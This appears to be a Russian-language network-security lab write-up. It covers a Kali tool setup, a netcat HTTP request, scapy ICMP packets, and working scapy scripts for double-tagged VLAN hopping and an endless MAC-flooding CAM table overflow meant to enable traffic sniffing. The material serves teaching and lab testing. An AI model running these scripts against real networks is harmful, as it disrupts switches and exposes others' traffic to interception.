## Установка инструментов на Kali

```bash
sudo apt install netcat-openbsd -y
sudo apt install hping3 -y
sudo apt install python3-scapy python3-netfilterqueue -y
```
- netcat-openbsd — это современная и функциональная версия netcat, которая подходит для большинства задач (ручные HTTP-запросы, передача файлов, reverse shells).
- hping3 используется для генерации специализированных пакетов (SYN flood, ICMP ping, сканирование портов и т.д.).
- python3-scapy — полная библиотека для создания, отправки и анализа сетевых пакетов.
- python3-netfilterqueue — позволяет перехватывать и изменять пакеты в цепочках Netfilter.

## Генерация трафика (netcat)

### Подготовка веб-сервера на Windows Server

Был запущен HTTP-сервер с помощью встроенного класса .NET `HttpListener` в PowerShell. Сервер слушает порт 8080 на всех интерфейсах и отвечает на любой GET-запрос фиксированной HTML-страницей.

```powershell
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://+:8080/")
$listener.Start()
Write-Host "Server started, waiting for requests..."

while ($listener.IsListening) {
    $context = $listener.GetContext()
    $response = $context.Response
    $html = "<html><body><h1>Hello from Windows Server!</h1></body></html>"
    $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
    $response.ContentLength64 = $buffer.Length
    $response.OutputStream.Write($buffer, 0, $buffer.Length)
    $response.OutputStream.Close()
}
```

- `New-Object System.Net.HttpListener` – создаёт объект HTTP-слушателя.
- `.Prefixes.Add("http://+:8080/")` – добавляет префикс (URL), на котором слушатель будет принимать запросы. `+` означает «все сетевые интерфейсы».
- `.Start()` – запускает прослушивание.
- Цикл `while` – обрабатывает входящие запросы:
  - `GetContext()` – ожидает подключения.
  - Формируется HTML-ответ и преобразуется в байтовый массив.
  - Устанавливается длина содержимого и ответ отправляется через поток вывода.

### Отправка HTTP-запроса с Kali Linux с помощью netcat

На атакующей машине была использована утилита `nc` (netcat) для установки TCP-соединения с портом 8080 целевого сервера и передачи HTTP GET-запроса.

```bash
echo -e "GET / HTTP/1.1\nHost: 192.168.211.10\n\n" | nc 192.168.211.10 8080
```

- `echo -e "GET / HTTP/1.1\nHost: 192.168.211.10\n\n"` – генерирует строку с HTTP-запросом:
  - `GET / HTTP/1.1` – метод GET, корневой ресурс `/`, версия протокола 1.1.
  - `Host: 192.168.211.10` – обязательный заголовок Host для HTTP/1.1.
  - Два перевода строки (`\n\n`) – завершение заголовков.
- `| nc 192.168.211.10 8080` – передаёт сгенерированную строку через netcat. `nc` открывает TCP-сокет к указанному IP и порту, отправляет данные, затем выводит полученный ответ.

## Генерация ICMP-запроса (ping) с помощью scapy

### Первая попытка (неудачная)

Был написан скрипт, формирующий ICMP-пакет только с заголовком (без данных).

```python
#!/usr/bin/env python3
from scapy.all import *

target = "192.168.211.10"
packet = IP(dst=target)/ICMP()
reply = sr1(packet, timeout=2, verbose=True)
if reply:
    print(f"Ответ от {reply[IP].src}: тип ICMP {reply[ICMP].type}")
else:
    print("Нет ответа")
```

- IP(dst=target)/ICMP() – создаёт IP-пакет с протоколом ICMP без поля данных.
- sr1() – отправляет пакет и ожидает ответ.

### Вторая попытка (успешная)

Добавлено поле данных (56 байт), как в стандартном ping.

```python
#!/usr/bin/env python3
from scapy.all import *

target = "192.168.211.10"
packet = IP(dst=target)/ICMP()/Raw(load=b"ping"*14)
reply = sr1(packet, timeout=2, verbose=True)
if reply:
    print(f"Ответ от {reply[IP].src}")
```

- Raw(load=b"ping"*14) – добавляет полезную нагрузку из 56 байт (строка "ping" повторена 14 раз).

## VLAN Hopping

Был создан скрипт `vlan_hopping.py` для отправки кадра Ethernet с двумя тегами VLAN (QinQ) на роутер (192.168.207.1).

```python
#!/usr/bin/env python3
from scapy.all import *

packet = Ether()/Dot1Q(vlan=10)/Dot1Q(vlan=20)/IP(dst="192.168.207.1")/ICMP()
sendp(packet, iface="eth1", verbose=True)
```
- Ether() – создаёт Ethernet-кадр.
- Dot1Q(vlan=10) – добавляет первый тег VLAN (внешний).
- Dot1Q(vlan=20) – добавляет второй тег (внутренний) – технология QinQ.
- IP-пакет с ICMP направлен на роутер (192.168.207.1), чтобы проверить, примет ли он кадр.

**Запуск:**
```bash
sudo python3 vlan_hopping.py
```

## CAM Table Overflow

Коммутаторы хранят таблицу соответствия MAC-адресов портам. Если отправить большое количество кадров с разными MAC-адресами, таблица может переполниться. В результате коммутатор начинает работать в режиме концентратора (hub) – рассылать все кадры на все порты, что позволяет перехватывать трафик.

### Скрипт `mac_flood.py`

```python
#!/usr/bin/env python3
from scapy.all import *
import time

while True:
    eth = Ether(src=RandMAC(), dst=RandMAC())
    sendp(eth, iface="eth1", count=100, verbose=False)
    time.sleep(0.1)
```

- `RandMAC()` – генерирует случайный MAC-адрес.
- Каждые 0,1 секунды отправляется 100 кадров со случайными MAC-адресами источника и назначения.
- Атака длится бесконечно (до прерывания).

### Запуск

```bash
sudo python3 mac_flood.py
```

**Проверка на роутере:**

```bash
sudo tcpdump -i ens36 -e -n -c 10
```
